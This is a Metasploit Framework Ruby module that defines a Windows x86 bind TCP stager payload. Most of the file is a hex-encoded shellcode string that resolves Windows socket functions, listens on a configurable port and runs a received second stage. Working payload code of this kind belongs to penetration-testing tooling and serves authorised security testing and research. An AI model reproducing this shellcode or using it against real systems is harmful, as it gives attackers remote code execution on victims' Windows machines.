##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'


module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Windows

  handler module_name: 'Msf::Handler::BindTcp',
          type_alias: 'bind_nonx_tcp'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Bind TCP Stager (No NX or Win7)',
      'Description'   => 'Listen for a connection (No NX)',
      'Author'        => 'vlad902',
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Convention'    => 'sockedi',
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LPORT' => [ 144, 'n' ],
            },
          'Payload' =>
            "\xfc\x6a\xeb\x47\xe8\xf9\xff\xff\xff\x60\x31\xdb\x8b\x7d\x3c\x8b" +
            "\x7c\x3d\x78\x01\xef\x8b\x57\x20\x01\xea\x8b\x34\x9a\x01\xee\x31" +
            "\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x84\xc0\x75\xf6\x43\x66\x39\xca" +
            "\x75\xe3\x4b\x8b\x4f\x24\x01\xe9\x66\x8b\x1c\x59\x8b\x4f\x1c\x01" +
            "\xe9\x03\x2c\x99\x89\x6c\x24\x1c\x61\xff\xe0\x31\xdb\x64\x8b\x43" +
            "\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x5e\x66\x53\x66\x68" +
            "\x33\x32\x68\x77\x73\x32\x5f\x54\x66\xb9\x72\x60\xff\xd6\x95\x53" +
            "\x53\x53\x53\x53\x43\x53\x43\x53\x89\xe7\x66\x81\xef\x08\x02\x57" +
            "\x53\x66\xb9\xe7\xdf\xff\xd6\x66\xb9\xa8\x6f\xff\xd6\x97\x66\x68" +
            "\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x57\x66\xb9\x80\x3b\xff\xd6" +
            "\x53\x57\x66\xb9\x75\x49\xff\xd6\x54\x54\x54\x57\x66\xb9\x32\x4c" +
            "\xff\xd6\x97\x50\x66\xb9\x33\xce\xff\xd6\x89\xe1\x50\xb4\x0c\x50" +
            "\x51\x57\x51\x66\xb9\xc0\x38\xff\xe6"
        }
      ))
  end

end
